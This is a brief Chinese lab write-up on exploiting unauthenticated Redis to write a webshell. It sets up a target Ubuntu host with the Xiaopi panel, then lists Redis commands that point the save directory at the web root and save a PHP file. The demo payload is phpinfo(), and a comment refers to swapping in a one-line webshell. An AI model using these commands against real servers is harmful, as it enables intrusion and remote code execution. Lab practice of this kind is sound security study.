# redis未授权写shell

## 利用条件

已知服务路径

## 环境

靶机：ubuntu 16.02

## 安装小皮面板充当服务器

https://www.xp.cn/linux.html#install-show

## 小皮面板后台管理设置

![image-20210702104824334](.\images\image16.png)

## 漏洞利用过程

```
config get dir
# 设置备份路径为服务器根目录
config set dir /www/admin/test_80/wwwroot

config get dbfilename
# 备份文件名称为随上传的一句话木马改变而改变
set dbfilename test.php
set x "<?php phpinfo();?>
```

![image-20210702104116870](.\images\image14.png)

![image-20210702104631109](.\images\image15.png)